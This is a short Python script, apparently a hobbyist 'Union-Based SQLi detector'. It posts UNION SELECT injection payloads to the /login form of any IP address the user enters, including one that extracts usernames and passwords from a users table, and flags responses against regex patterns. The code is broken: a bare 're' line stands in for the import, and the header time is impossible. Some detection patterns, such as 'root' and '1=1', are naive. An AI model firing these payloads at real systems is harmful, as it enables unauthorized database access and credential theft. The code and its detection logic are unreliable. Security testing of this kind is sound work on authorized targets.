# -*- coding: utf-8 -*-
"""
Created on Fri Feb  21 03:345:47 2025

@author: IAN CARTER KULANI

"""

from colorama import Fore
import pyfiglet
import os
font=pyfiglet.figlet_format("UNION BASED SQLi DETECTOR")
print(Fore.GREEN+font)

import requests
re

# Function to check for Union-Based SQL Injection patterns in the response
def detect_union_sql_injection(response_text):
    # Patterns indicating potential Union-Based SQL injection vulnerability
    patterns = [
        r"UNION.*SELECT.*FROM.*information_schema.tables",   # Detecting UNION SELECT query to fetch database table names
        r"UNION.*SELECT.*FROM.*mysql.db",                     # Checking for MySQL databases
        r"SELECT.*FROM.*dual",                                # Common pattern in UNION injection
        r"database_name",                                     # Looking for database names in the response
        r"root",                                              # Detecting the presence of root user (common in SQLi)
        r"1=1",                                               # Bypass pattern
    ]
    
    # Check if any of the patterns are found in the response
    for pattern in patterns:
        if re.search(pattern, response_text, re.IGNORECASE):
            return True
    return False

# Function to simulate an HTTP request to check for Union SQL injection
def check_union_sql_injection(ip_address):
    print(f"Checking for potential Union-Based SQL Injection on {ip_address}...")
    
    # Simulate a form submission with potential Union SQL injection payloads
    payloads = [
        "' UNION SELECT null, null, null--",   # Basic UNION SELECT payload
        "' UNION SELECT 1, 2, 3, 4, 5, 6--",   # Basic UNION with multiple columns
        "' UNION SELECT null, username, password FROM users--",   # Injecting into login table
        "' UNION SELECT null, table_name FROM information_schema.tables--", # Fetch table names
    ]
    
    # Try submitting the payloads to a hypothetical login page or endpoint
    url = f"http://{ip_address}/login"  # Example URL; adjust based on the target application
    
    for payload in payloads:
        # Example POST request with payload in the 'username' field
        data = {'username': payload, 'password': 'password'}
        try:
            response = requests.post(url, data=data)
            
            if response.status_code == 200:
                # Check the response for signs of Union-Based SQL Injection vulnerability
                if detect_union_sql_injection(response.text):
                    print(f"[!] Potential Union-Based SQL Injection detected with payload: {payload}")
                    print(f"Response from server: {response.text[:200]}")  # Display part of the response for inspection
            else:
                print(f"[+] Request failed with status code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"[!] Error making request: {e}")

# Main function
def main():
    
    # Prompt the user for an IP address to test for SQL Injection
    ip_address = input("Enter the target IP address:")
    
    # Start detecting Union SQL Injection attempts
    check_union_sql_injection(ip_address)

if __name__ == "__main__":
    main()
